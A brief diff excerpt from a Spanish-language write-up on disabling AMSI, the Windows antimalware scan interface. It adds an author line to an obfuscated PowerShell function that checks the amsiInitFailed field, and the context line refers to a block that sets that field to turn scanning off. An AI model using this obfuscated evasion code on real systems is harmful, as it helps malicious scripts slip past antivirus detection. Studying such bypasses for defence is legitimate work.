@@ -7,6 +7,7 @@ Luego, el bloque **`try`** intenta deshabilitar AMSI estableciendo el campo 'ams
 
 
 ```
+# Author: Taurus Omar
 # Verify if AMSI is disabled
 function Is-AMSIDisabled {
     return ((Get-variable (('1Q'+'2U') +'zX'))."A`ss`Embly"."GET`TY`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).GetValue($null) -eq $true
